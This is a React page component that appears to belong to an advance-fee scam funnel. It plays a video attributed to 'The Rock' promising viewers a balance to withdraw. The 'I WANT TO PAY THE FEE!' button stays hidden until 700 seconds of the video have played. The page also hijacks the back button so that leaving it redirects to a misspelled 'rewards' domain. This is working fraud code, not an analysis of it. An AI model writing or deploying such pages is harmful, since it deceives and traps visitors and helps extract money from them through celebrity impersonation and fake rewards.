
import Button from "@/components/button";
import Comments from "@/components/comments";
import PlacesAlert from "@/components/places-alert";
import VSLBlackRock from "@/components/videos/vsl-black-rock";
import { useLayer } from "@/context/layer-provider";
import { useEffect, useState } from "react";
import { CheckCheck, Loader2 } from "lucide-react";

export default function Page({
  active,
  handleClick,
}: {
  active: boolean;
  handleClick: () => void;
}) {
  // COMPONENT STATES
  const [visible, setVisible] = useState<boolean>(false);

  // IMPORT CONTEXT DATA
  const userLayerData = useLayer();
  const userFrontLink = userLayerData.frontLink;

  // SET CONTENT DATA
  const VSL = VSLBlackRock;
  const videoId = "693ac865b51c07f39243a920";
  const backLink = "https://rewardsprogam.site/promo";
  const pitchTime = 700;

  // VIDEO VERIFY
  useEffect(() => {
    if (visible) return;

    const intervalId = window.setInterval(() => {
      const storedVideoTime = Number(
        window.localStorage.getItem(`${videoId}-resume`)
      );

      if (storedVideoTime > pitchTime) {
        setVisible(true);
      }
    }, 1000);

    return () => window.clearInterval(intervalId);
  }, [videoId, visible]);

  // BACK REDIRECT
  useEffect(() => {
    const handlePopState = () => {
      window.location.replace(backLink);
    };

    window.history.pushState(
      { page: "rock" },
      "",
      window.location.href
    );

    window.addEventListener("popstate", handlePopState);

    return () => {
      window.removeEventListener("popstate", handlePopState);
    };
  }, [backLink]);

  return (
    <>
      <div className="flex flex-col text-center text-sm rounded-3xl gap-5 bg-gradient-to-t appear border-t px-4 py-6 from-gray-50 to-gray-200/50 border-gray-300">
        <span className="text-base sm:text-2xl font-semibold text-balance tracking-tight">
          See the message The Rock has for you to withdraw your balance! 👇
        </span>

        <PlacesAlert visible={visible} />
      </div>

      <div className="flex flex-col items-center gap-8 relative -mt-4">
        <VSL />

        {visible && (
          <a href={userFrontLink}>
            <Button
              onClick={handleClick}
              disabled={active}
              className="pulse border-b-4 !px-6 !py-3 !bg-green-500 !border-green-600 hover:!bg-green-600"
            >
              {active ? (
                <Loader2 className="size-5 animate-spin" />
              ) : (
                <CheckCheck className="size-5" />
              )}

              <span>I WANT TO PAY THE FEE!</span>
            </Button>
          </a>
        )}
      </div>

      {!visible && (
        <div className="text-sm text-center p-2">
          🔊 Check if your sound is turned on
        </div>
      )}

      <Comments />
    </>
  );
}